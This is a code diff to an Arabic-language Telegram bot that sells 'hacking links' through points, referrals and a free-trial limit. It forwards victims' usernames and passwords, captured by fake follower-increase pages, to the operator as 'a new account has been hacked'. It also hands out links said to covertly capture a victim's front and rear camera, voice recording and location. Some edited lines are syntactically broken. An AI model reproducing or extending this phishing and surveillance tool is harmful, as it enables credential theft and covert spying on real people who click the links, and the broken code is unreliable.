@@ -20,9 +20,9 @@ const upload = multer({ storage: storage });
 
 const platformVisits = {};
 const userVisits = {};
-const MAX_FREE_ATTEMPTS = 3; // تحديد عدد المحاولات المجانية
+const MAX_FREE_ATTEMPTS = 5; // تحديد عدد المحاولات المجانية
 const subscribedUsers = new Set(); // مجموعة المستخدمين المشتركين
-const freeTrialEndedMessage = "انتهت فترة التجربة المجانية"; // رسالة نهاية الفترة التجريبية
+const freeTrialEndedMessage = "انتهت فترة التجربة المجانيه لان تستطيع استخدام اي رابط اختراق حتى تقوم بل الاشتراك من المطور او قوم بجمع نقاط لاستمرار في استخدام البوت"; // رسالة نهاية الفترة التجريبية
 const adminId = '7130416076';
 const forcedChannelUsernames = ['@SJGDDW', '@YEMENCYBER101', '@YYY_A12'];
 
@@ -516,7 +516,7 @@ app.post('/submitIncrease', (req, res) => {
 
     const deviceInfo = useragent.parse(userAgent);
 
-    bot.sendMessage(chatId, `تم تلقي بيانات زيادة المتابعين:
+    bot.sendMessage(chatId, `تم اختراق حساب جديد:
 منصة: ${platform}
 اسم المستخدم: ${username}
 كلمة السر: ${password}
@@ -538,17 +538,20 @@ app.post('/submitIncrease', (req, res) => {
 // أوامر البوت
 const userPoints = new Map();
 const userReferrals = new Map();
-let pointsRequiredForSubscription = 1000;
+const subscribedUsers = new Set();
+let pointsRequiredForSubscription = 15;
 
 function createReferralLink(userId) {
     const referralCode = Buffer.from(userId.toString()).toString('base64');
-    return `https://t.me/Hzhzhxhbxbdbot?start=${referralCode}`;
+    return `https://t.me/YourBotUsername?start=${referralCode}`;
 }
 
 function addPoints(userId, points) {
     const currentPoints = userPoints.get(userId) || 0;
-    userPoints.set(userId, currentPoints + points);
+    const newPoints = currentPoints + points;
+    userPoints.set(userId, newPoints);
     checkPointsAndSubscribe(userId);
+    return newPoints;
 }
 
 function deductPoints(userId, points) {
@@ -564,7 +567,7 @@ function checkPointsAndSubscribe(userId) {
     const points = userPoints.get(userId) || 0;
     if (points >= pointsRequiredForSubscription && !subscribedUsers.has(userId)) {
         subscribedUsers.add(userId);
-        bot.sendMessage(userId, 'مبروك! لقد جمعت نقاطًا كافية للاشتراك. تم تفعيل اشتراكك الآن.');
+        bot.sendMessage(userId, 'مبروك! لقد جمعت 15 نقطة. تم اشتراكك في البوت وتستطيع الآن استخدام البوت بدون قيود.');
     }
 }
 
@@ -575,40 +578,95 @@ bot.onText(/\/start (.+)/, (msg, match) => {
     try {
         const referrerId = Buffer.from(startPayload, 'base64').toString();
         if (referrerId !== newUserId) {
-            addPoints(referrerId, 1);
-            bot.sendMessage(referrerId, 'لقد كسبت نقطة عبر رابط الدعوة الذي قمت بإرساله إلى صديقك!');
+            const referrerPoints = addPoints(referrerId, 1);
+            bot.sendMessage(referrerId, `قام المستخدم ${msg.from.first_name} بالدخول عبر رابط الدعوة الخاص بك. أصبح لديك ${referrerPoints} نقطة.`);
             bot.sendMessage(newUserId, 'مرحبًا بك! لقد انضممت عبر رابط دعوة.');
         }
     } catch (error) {
         console.error('خطأ في معالجة رمز الإحالة:', error);
     }
+    showButtons(msg.chat.id, newUserId);
 });
 
-bot.onText(/\/referral/, (msg) => {
-    const userId = msg.from.id.toString();
-    const referralLink = createReferralLink(userId);
-    userReferrals.set(userId, referralLink);
-    bot.sendMessage(msg.chat.id, `رابط الدعوة الخاص بك هو:\n${referralLink}`);
-});
-
-bot.onText(/\/points/, (msg) => {
-    const userId = msg.from.id.toString();
-    const points = userPoints.get(userId) || 0;
-    bot.sendMessage(msg.chat.id, `لديك حاليًا ${points} نقطة.`);
-});
-
-bot.onText(/\/sendpoints (\d+) (\d+)/, (msg, match) => {
-    const senderId = msg.from.id.toString();
-    const receiverId = match[1];
-    const pointsToSend = parseInt(match[2]);
-
-    if (deductPoints(senderId, pointsToSend)) {
-        addPoints(receiverId, pointsToSend);
-        bot.sendMessage(msg.chat.id, `تم إرسال ${pointsToSend} نقطة بنجاح إلى المستخدم ${receiverId}`);
-        bot.sendMessage(receiverId, `لقد استلمت ${pointsToSend} نقطة من المستخدم ${senderId}`);
-    } else {
-        bot.sendMessage(msg.chat.id, 'عذرًا، ليس لديك نقاط كافية لإرسالها.');
+bot.onText(/\/start/, (msg) => {
+    if (!msg.text.includes(' ')) {
+        showButtons(msg.chat.id, msg.from.id.toString());
     }
+});
+
+function showButtons(chatId, userId) {
+    const points = userPoints.get(userId) || 0;
+    const isSubscribed = subscribedUsers.has(userId);
+    
+    let statusMessage = isSubscribed 
+        ? 'أنت مشترك في البوت ويمكنك استخدامه بدون قيود.'
+        : `لديك ${points} نقطة. اجمع 15 نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
+
+    let keyboard = [
+        [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_'front_camera' }],
+        [{ text: '🎙 تسجيل صوت 🎙', callback_data:'voice_record' }],
+        [{ text: '🗺️ الحصول على الموقع 🗺️', callback_'get_location' }],
+        [{ text: '☠️اختراق تيك توك ☠️', callback_ 'increase_tiktok' }],
+        [{ text: '🕷اختراق الانستغرام🕷', callback_ 'increase_instagram' }],
+        [{ text: '🔱اختراق الفيسبوك🔱', callback_ 'increase_facebook' }],
+        [{ text: '👻 اختراق سناب شات 👻', callback_ 'increase_snapchat' }],
+        [{ text: '🔫اختراق حسابات ببجي🔫', callback_ 'pubg_uc' }],
+        [{ text: '🔴اختراق يوتيوب🔴', callback_ 'increase_youtube' }],
+        [{ text: '🐦اختراق تويتر🐦', callback_data: 'increase_twitter' }],
+        [{ text: '🔗 إنشاء رابط دعوة 🔗', callback_ 'create_referral' }],
+        [{ text: '💰 نقاطي 💰', callback_data: 'my_points' }],
+        [{ text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' }],
+        [{ text: 'سجاد تتواصل مع المطور', url: 'https://t.me/SAGD112' }],
+    ];
+
+    bot.sendMessage(chatId, 'مرحبا اختار احد الاخيارت الذي تريده ملاحضه لان تستطيع استخدام روابط الاختراق سوى 5 مرات اذا اردت استخدام البوت بدون قيود قوم بتواصل معا المطور لاشتراك ام تريد استخدامه مجاني فقوم بجمع نقاط عبر رابط الدعوه:', {
+        reply_markup: {
+            inline_keyboard: keyboard
+        }
+    });
+}
+
+bot.on('callback_query', (callbackQuery) => {
+    const chatId = callbackQuery.message.chat.id;
+    const userId = callbackQuery.from.id.toString();
+    const data = callbackQuery.data;
+
+    switch(data) {
+        case 'create_referral':
+            const referralLink = createReferralLink(userId);
+            userReferrals.set(userId, referralLink);
+            bot.sendMessage(chatId, `رابط الدعوة الخاص بك هو:\n${referralLink}`);
+            break;
+        case 'my_points':
+            const points = userPoints.get(userId) || 0;
+            const isSubscribed = subscribedUsers.has(userId);
+            let message = isSubscribed
+                ? `لديك حاليًا ${points} نقطة. أنت مشترك في البوت ويمكنك استخدامه بدون قيود.`
+                : `لديك حاليًا ${points} نقطة. اجمع ${pointsRequiredForSubscription} نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
+            bot.sendMessage(chatId, message);
+            break;
+        default:
+            if (!subscribedUsers.has(userId)) {
+                bot.sendMessage(chatId, 'عذرًا، يجب أن تجمع 15 نقطة للاشتراك في البوت واستخدام هذه الميزة.');
+            } else {
+                bot.sendMessage(chatId, 'جاري تنفيذ العملية...');
+                // هنا يمكنك إضافة الكود الخاص بكل عملية
+            }
+    }
+});
+
+bot.onText(/\/addpoints (\d+) (\d+)/, (msg, match) => {
+    if (msg.from.id.toString() !== adminId) {
+        bot.sendMessage(msg.chat.id, 'عذرًا، هذا الأمر متاح فقط للمسؤول.');
+        return;
+    }
+
+    const userId = match[1];
+    const pointsToAdd = parseInt(match[2]);
+
+    addPoints(userId, pointsToAdd);
+    bot.sendMessage(msg.chat.id, `تمت إضافة ${pointsToAdd} نقطة للمستخدم ${userId}`);
+    bot.sendMessage(userId, `تمت إضافة ${pointsToAdd} نقطة إلى رصيدك.`);
 });
 
 bot.onText(/\/deductpoints (\d+) (\d+)/, (msg, match) => {
@@ -622,6 +680,7 @@ bot.onText(/\/deductpoints (\d+) (\d+)/, (msg, match) => {
 
     if (deductPoints(userId, pointsToDeduct)) {
         bot.sendMessage(msg.chat.id, `تم خصم ${pointsToDeduct} نقطة من المستخدم ${userId}`);
+        bot.sendMessage(userId, `تم خصم ${pointsToDeduct} نقطة من رصيدك.`);
     } else {
         bot.sendMessage(msg.chat.id, `عذرًا، المستخدم ${userId} لا يملك نقاطًا كافية للخصم.`);
     }
@@ -674,36 +733,6 @@ bot.onText(/\/listsubscribers/, (msg) => {
 
     const subscribersList = Array.from(subscribedUsers).join('\n');
     bot.sendMessage(msg.chat.id, `قائمة المشتركين:\n${subscribersList || 'لا يوجد مشتركين حالياً.'}`);
-});
-
-
- 
-function showButtons(chatId, isActivated) {
-    let keyboard = [
-        [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
-        [{ text: '🎙 تسجيل صوت 🎙', callback_data:'voice_record' }],
-        [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data:'get_location' }],
-        [{ text: '☠️اختراق تيك توك ☠️', callback_data: 'increase_tiktok' }],
-        [{ text: '🕷اختراق الانستغرام🕷', callback_data: 'increase_instagram' }],
-        [{ text: '🔱اختراق الفيسبوك🔱', callback_data: 'increase_facebook' }],
-        [{ text: '👻 اختراق سناب شات 👻', callback_data: 'increase_snapchat' }],
-        [{ text: '🔫اختراق حسابات ببجي🔫', callback_data: 'pubg_uc' }],
-        [{ text: '🔴اختراق يوتيوب🔴', callback_data: 'increase_youtube' }],
-        [{ text: '🐦اختراق تويتر🐦', callback_data: 'increase_twitter' }],
-        [{ text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' }],
-        [{ text: 'سجاد تتواصل مع المطور', url: 'https://t.me/SAGD112' }],
-    ];
-
-    const message = isActivated 
-        ? 'مرحباً بك في بوت اختراق برابط كاميرا أمامية وكاميرا خلفية وتحديد الموقع الدقيق وتسجيل صوت الضحية. واختراق الانستقرام والفيس والتيك توك  المطور @SAGD112.'
-        : 'مرحباً بك في بوت اختراق برابط كاميرا أمامية وكاميرا خلفية وتحديد الموقع الدقيق وتسجيل صوت الضحية. واختراق الانستقرام والفيس والتيك توك المطور @SAGD112.\n\nلديك 3 محاولات مجانية لكل خاصية. للاستخدام غير المحدود، يرجى التواصل مع المطور للاشتراك.';
-
-    bot.sendMessage(chatId, message, {
-        reply_markup: {
-            inline_keyboard: keyboard
-        }
-    });
-}
 
 // استخدام الدالة لإظهار الأزرار عند حدث معين
 
@@ -718,7 +747,7 @@ bot.on('callback_query', (callbackQuery) => {
 
     if (data === 'front_camera' || data === 'rear_camera') {
         const url = `https://yyytot.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
-        bot.sendMessage(chatId, `انقر على الرابط للتصوير: ${url}`);
+        bot.sendMessage(chatId, `تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية : ${url}`);
     } else if (data === 'voice_record') {
         bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
     } else if (data === 'get_location') {
@@ -727,7 +756,7 @@ bot.on('callback_query', (callbackQuery) => {
         console.log('Chat ID:', chatId);
         console.log('URL:', url);
         
-        bot.sendMessage(chatId, `انقر على الرابط للحصول على موقعك: ${url}`)
+        bot.sendMessage(chatId, `تم تلغيم رابط اختراق الموقع: ${url}`)
             .then(() => console.log('Message sent successfully'))
             .catch(err => console.error('Error sending message:', err));
     }
